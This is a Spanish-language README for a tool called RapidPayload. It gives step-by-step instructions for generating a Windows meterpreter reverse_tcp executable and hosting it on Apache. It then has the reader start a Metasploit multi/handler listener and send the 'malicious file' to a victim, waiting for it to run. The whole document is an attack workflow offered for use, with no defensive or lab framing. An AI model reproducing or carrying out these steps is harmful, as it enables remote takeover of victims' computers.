# RapidPayload
Es un programa para crear payload semiautomatico

## Windows
1. opcion 1 (windows)
2. opcion 3 (reverse_tcp)

### Configuracion 
1. LHOST (Id Kali)
2. LPORT 4444
3. FilenName test

### Se crea un archivo test.exe

4. Movemos el archivo al rservidor de apache:
   * mv test.exe /var/www/html
5. Levantamos apache:
   * service apache2 start
   * service apache2 status

### Metasploit
6. service postgresql start && msfdb init && msfconsole -q
7. use exploit/multi/handler
   
### Configuracion del modulo en metasploit
8. set PAYLOAD windows/meterpreter/reverse_tcp
9. set LHOST (id kali)
10. set LPORT 4444(puerto del archivo creado)
11. options (para confirmar los datos)
12. exploit -j(se ejecuta en 2do plano)
13. ES EL MOMENTO DE MANDAR EL ARCHIVO MALIOSO
14. QUEDA ESCUCHANDO HASTA QUE SE EJECUTE EN ARCHIVO EN EL EQUIPO VICTIMA 